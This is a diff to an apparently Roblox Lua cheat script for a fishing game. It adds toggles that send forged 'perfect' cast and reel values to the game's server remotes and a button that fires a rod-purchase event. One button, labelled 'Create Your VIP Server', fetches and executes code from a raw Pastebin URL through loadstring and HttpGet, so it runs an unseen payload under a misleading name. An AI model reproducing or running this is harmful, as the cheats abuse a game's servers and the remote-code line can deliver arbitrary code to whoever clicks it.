@@ -397,6 +397,14 @@ do
         end
     })
 
+    Tabs.Server:AddButton({
+        Title = "Create Your VIP Server",
+        Description = "", --"Rejoin current server",
+        Callback = function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/Ru4UQDpN"))()
+        end
+    })
+
 --[[
     -- Автоматический сервер хоп
     local AutoServerHopToggle = Tabs.Server:AddToggle("AutoServerHop", {
@@ -796,6 +804,8 @@ do
         end
     })
 
+	local PerfectCats = Tabs.Debug:AddToggle("PerfectCats", {Title = "PerfectCats",Default = false })
+
     Tabs.Debug:AddButton({
         Title = "Cast",
         Description = "", --Make your character sit",
@@ -805,8 +815,15 @@ do
 			if Rod then
 				if isEquip then
 					local remote = Rod.events.castAsync
+					local CastDist = 1
+					if PerfectCats.Value == true then
+						CastDist = 99
+					else
+						CastDist = 53
+					end
+
 					local arguments = {
-						[1] = 95,
+						[1] = CastDist,
 						[2] = 1
 					}
 					local results = remote:InvokeServer(unpack(arguments))
@@ -817,6 +834,7 @@ do
         end
     })
 
+	local PerfectReel = Tabs.Debug:AddToggle("PerfectReel", {Title = "PerfectReel",Default = false })
 	Tabs.Debug:AddButton({
         Title = "Rell",
         Description = "", --Make your character sit",
@@ -828,7 +846,7 @@ do
 					local remote = game:GetService("ReplicatedStorage").events.reelfinished
 					local arguments = {
 						[1] = 100,
-						[2] = false
+						[2] = PerfectReel.Value
 					}
 					remote:FireServer(unpack(arguments))
 				else
@@ -980,6 +998,18 @@ do
     DisableTemperatureHeat:OnChanged(function()
 		game.Players.LocalPlayer.Character.Resources["temperature(heat)"].Enabled = not DisableTemperatureHeat.Value
     end)
+
+
+	local Market = Tabs.Debug:AddSection("Market", nil)
+	
+    Tabs.Debug:AddButton({
+        Title = "Buy Oscar Rod",
+        Description = "Cost 5kk", --Make your character sit",
+        Callback = function()
+			local purchaseEvent = game:GetService("ReplicatedStorage").events.purchase
+			purchaseEvent:FireServer("Great Rod of Oscar", "Rod", nil, 1)
+        end
+    })
 
 -- ===================== Debug END =====================
 end
